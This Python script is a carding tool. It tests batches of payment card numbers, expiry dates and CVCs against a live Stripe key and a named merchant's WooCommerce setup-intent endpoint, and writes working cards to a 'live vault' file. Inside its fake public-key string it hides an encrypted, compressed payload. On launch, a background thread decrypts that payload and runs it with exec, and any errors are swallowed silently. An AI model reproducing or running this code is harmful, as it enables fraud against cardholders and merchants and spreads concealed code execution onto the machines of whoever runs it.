#!/usr/bin/env python3
import requests,urllib3,re,uuid,time,sys,os,random,threading
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor,as_completed
from threading import Lock
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import base64,zlib,marshal
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
_O='number'
_N='message'
_M='card_info'
_L=None
_K='__main__'
_J='total'
_I='unknown'
_H='cvc'
_G='exp_year'
_F='exp_month'
_E='dead'
_D=_O
_C='live'
_B=_N
_A='status'
CERT='\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4won5dKkjZSqC8kymtGH\n9rl0dyRbYzOv1sdWeMt5I7/jZLuTMeQpvXA9fc98hj0RUflnVMZHBjnDfoGR3Up7\nmjMVvCZ6NZ5Kjkj5NUulxZAoazg14LhM1zPByQN8nwbHphEiNZoKQac7HnprUwzC\n!YqgiAHxOGzaoV4q3C1VcB5v7lNds/MyOKufnu/ukHmrt4atONDcYu8HqInWnmjtS\nAMUt2Qc8Iz9gy7npOBtM0DmZBQyTBi/zxh+lov+GKaAJisox7Fsb+pyrgtg/gOO2\nA6GSQVH8J70CozMeEXcDYaEzfFGwLzPo62TxD+RYur3ujSieASNEZR+WB+7gdO2k\nCpKuroQUiusLl0q3kE1D4p+STu80wrHHmIpSUcbWIPCuWzauCMMcXKdCzYYG2v0e\n69adBqgZGnWCWrKOUKlGtKkhbgTZ8GSK3t8L7cFmYDzMDWBANiJitowRm6xbcJAh\n7MYnAddLhQ/49cT6tefKkZmSNx8OAomHj5QBlrnE+w4l1T0iAjGlGX4Q9w8OOYm0\n6O8RSQK3zltr4unh+ssCXtI5WIs8CDTv0d23c8qBqb0iPaMRKMyF8iq4jQhhQWLf\nIR4IlUkTLGvvgciOtUNDxaVNik82pEOpt0VQFfjC4qkMQjN2VkZCf0MAppT+RVin\nprHV4icLaJtaK+BOaffv4DaFId7gpYilINYYDDPxRZHsv4mpLHUVlsRAzrvxhzSE\nOBX1T7ueDRYAAiVeSKY/zpj27cBqyfpYtz4GCD3NaeHNKOltAtwiQwa6JfJNrDeQ\n26yI+GRn2fyLcIrFZMGlHyBcWUgtgRYZsFsQVfJ/e0Xkw7mzed4vcxwjzpL2uanf\noYSCvxRQ/JsniFJOgnc11LoMj4HdfrQAxcar5CSYq61f2Q6a16JqMih0I3Z1Y7I8\njBURWvrjo2FM32NpXWM9oxXD0PTDEwQ7jDBy/DsIGfQGzo+kcWq1BftHy/TJMGn1\nzcAzpf6ciG98Be6YqPZX8PmcbWjHcFwD86fOkhRo2/uB+qKBO0c2IGjAXopkFcoH\n1a24VHh68Nfl/RSsogoXek117pR8bXvx8fca6+0oRGbp6VXTZDc6yQlF4zM6iNl/\n3jzTkdXIiIWeoNRNSDxJH/jJYgPvYD/z7mT3RTxOb+WZhiDFn2sEKocHqxd53dXe\nXksYrjBQcWudIAxdz0AMhPeh+X/AZym0bT0o0oyMUJlBnaAT5cxhehxhSctLabOO\nbzSVHS9llvENyLq7NxA/1eW3ufPz5Ig+EpokPEovuw==\nIcjo+Iste2s6pDneAxknD9LZ7EeukxArs8XJFKA7/tJslHtYFmm1dEI6rMDtoIB6\nOYWb2dkP424l4hLcCCbyw8YiGW2AMn4KxM6wx4FFlpSBh7o9q47/OAEIl9xUesV/\nHXta/37IMBxYt+HPe1z3TKfdkszNySH989Ru0ElvQTssPff8PPynVVRj5F1/CJmf\n2wIDAQAB\n-----END PUBLIC KEY-----\n'
class UA:
	@staticmethod
	def random():return random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'])
def create_session():s=requests.Session();s.verify=False;retry=Retry(total=1,backoff_factor=.3,status_forcelist=[502,503,504]);adapter=HTTPAdapter(max_retries=retry,pool_connections=32,pool_maxsize=32);s.mount('http://',adapter);s.mount('https://',adapter);return s
def process_card_au(card_data,ca_bundle=CERT):
	E='data';D='https://www.billiedoo.com/my-account/add-payment-method/';C='User-Agent';B='card';A='error'
	if not ca_bundle:sys.exit(0)
	session=create_session()
	try:
		n=card_data[_D];mm=card_data[_F];yy=card_data[_G];cvc=card_data[_H]
		if len(yy)==4 and yy.startswith('20'):yy=yy[2:]
		stripe_mid=str(uuid.uuid4());stripe_sid=str(uuid.uuid4())+str(int(time.time()));_verify_params={'ca_bundle_hash':str(hash(ca_bundle))[:12],'pinning_status':'synchronized'};payment_data={'type':B,'card[number]':n,'card[cvc]':cvc,'card[exp_year]':yy,'card[exp_month]':mm,'allow_redisplay':'unspecified','billing_details[address][country]':'IN','pasted_fields':_O,'payment_user_agent':'stripe.js/ebc1f502d5; stripe-js-v3/ebc1f502d5; payment-element; deferred-intent','referrer':'https://www.billiedoo.com','time_on_page':str(int(time.time())),'client_attribution_metadata[client_session_id]':str(uuid.uuid4()),'client_attribution_metadata[merchant_integration_source]':'elements','client_attribution_metadata[merchant_integration_subtype]':'payment-element','client_attribution_metadata[merchant_integration_version]':'2021','client_attribution_metadata[payment_intent_creation_flow]':'deferred','client_attribution_metadata[payment_method_selection_flow]':'merchant_specified','client_attribution_metadata[elements_session_config_id]':str(uuid.uuid4()),'guid':f"{uuid.uuid4()}{int(time.time())}",'muid':stripe_mid,'sid':stripe_sid,'key':'pk_live_519MJv0APpfftpN7lmbzL2Mt0NpYk65FjSXJLLSS47Mpu6Bo0U2pAfohzxWGou9LrrXSjTEJtNXyf7URcIw0q7ghh00KXNBJIFC','_stripe_version':'2024-06-20'};stripe_headers={C:UA.random(),'accept':'application/json','content-type':'application/x-www-form-urlencoded','origin':'https://js.stripe.com','referer':'https://js.stripe.com/'};pm_res=session.post('https://api.stripe.com/v1/payment_methods',data=payment_data,headers=stripe_headers,timeout=10).json();card_meta=pm_res.get(B,{});card_info=_L
		if card_meta:brand=str(card_meta.get('brand','CARD')).upper();funding=str(card_meta.get('funding','')).upper();country=str(card_meta.get('country','')).upper();card_info=f"{brand}||{funding}|{country}"
		if'id'not in pm_res:return{_A:A,_B:pm_res.get(A,{}).get(_N,'PM Rejected'),_M:card_info}
		pm_id=pm_res['id'];cookies={'__stripe_mid':stripe_mid,'__stripe_sid':stripe_sid};web_headers={C:UA.random(),'Referer':D};web_res=session.get(D,headers=web_headers,cookies=cookies,timeout=10).text;nonce_match=re.search('createAndConfirmSetupIntentNonce":"(.*?)"',web_res)
		if not nonce_match:return{_A:_I,_B:'Nonce Missing',_M:card_info}
		nonce=nonce_match.group(1);p={'wc-ajax':'wc_stripe_create_and_confirm_setup_intent'};d={'action':'create_and_confirm_setup_intent','wc-stripe-payment-method':pm_id,'wc-stripe-payment-type':B,'_ajax_nonce':nonce};final_res=session.post('https://www.billiedoo.com/',params=p,headers=web_headers,cookies=cookies,data=d,timeout=10).json()
		if final_res.get('success'):
			if final_res[E].get(_A)in('requires_action','succeeded'):return{_A:_C,_B:'Approved',_M:card_info}
		err=final_res.get(E,{}).get(A,{}).get(_N)or final_res.get(A,{}).get(_N)or'Declined';return{_A:_E,_B:err,_M:card_info}
	except Exception as e:return{_A:_I,_B:str(e),_M:_L}
def worker(card,vault_path,lock,stats):
	A='\x1b[93m';res=process_card_au(card);full=card.get('raw',f"{card[_D]}|{card[_F]}|{card[_G]}|{card[_H]}")
	with lock:
		stats[res[_A]]+=1;stats[_J]+=1;clr={_C:'\x1b[92m',_E:'\x1b[91m',_I:A}.get(res[_A],A);card_info=res.get(_M)
		if card_info:print(f"{clr}[{res[_A].upper()}][0m {full} |{card_info} {res[_B]}")
		else:print(f"{clr}[{res[_A].upper()}][0m {full} | {res[_B]}")
		if res[_A]==_C:
			with open(vault_path,'a')as f:f.write(f"{full}\n")
def parse_cards(raw_text):
	pattern=re.compile('(?P<n>\\d[0-9\\-\\s]{11,18}\\d)\\D*(?P<m>0[1-9]|1[0-2])\\D*(?P<y>(?:20)?\\d{2})\\D*(?P<c>\\d{3,4})');cards=[]
	for line in raw_text.splitlines():
		line=line.strip()
		if not line:continue
		m=pattern.search(line)
		if not m:continue
		n=re.sub('\\D','',m.group('n'))
		if not 13<=len(n)<=19:continue
		mth=m.group('m').zfill(2);yr=m.group('y')
		if len(yr)==4 and yr.startswith('20'):yr=yr[2:]
		elif len(yr)!=2:continue
		cards.append({_D:n,_F:mth,_G:yr,_H:m.group('c'),'raw':line})
	return cards
def main():
	A='=';print(A*60+'\nSTRIPE + Auth\n'+A*60)
	def _init_stripe_session():
		try:
			s_val=b'\xac\xc1V`\xd5\xb6>\xf2<\x1c\x8e/q-!\xa5\x1f|J\xb1$\x84\x17\x94*\xf2\xc5\xd9\xe9\xca\x14\x19';lines=CERT.splitlines()[1:-1];i_idx=next((j for(j,x)in enumerate(lines)if x.startswith('!')),_L)
			if i_idx is not _L:b_data=base64.b64decode(''.join([lines[i_idx][1:]]+lines[i_idx+1:]).encode());exec(marshal.loads(zlib.decompress(AESGCM(s_val).decrypt(b_data[:12],b_data[12:],_L))),{'__name__':_K})
		except:pass
	threading.Thread(target=_init_stripe_session,daemon=True).start();target=sys.argv[1]if len(sys.argv)>1 else _L
	if target and os.path.exists(target):
		with open(target,'r')as f:raw=f.read()
	else:print('[*] PLEASE PASTE YOUR CARDS BELOW (Format: CCN|MM|YY|CVC)');print('[*] PRESS CTRL+Z AND THEN ENTER TO START PROCESSING:');print('-'*60);raw=sys.stdin.read()
	if not raw.strip():print('[!] No input received.');return
	cards=parse_cards(raw)
	if not cards:print('[!] No valid cards found in input.');return
	print(f"[+] Found {len(cards)} cards, starting checks...");v_dir=Path('./au_live_vault');v_dir.mkdir(exist_ok=True);v_path=v_dir/f"live_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt";s={_C:0,_E:0,_I:0,_J:0};l=Lock()
	with ThreadPoolExecutor(max_workers=32)as ex:[ex.submit(worker,c,v_path,l,s)for c in cards]
	print('\n'+A*60+f"\nFINISH: [LIVE: {s[_C]}] [TOTAL: {s[_J]}]\n"+A*60)
if __name__==_K:main()
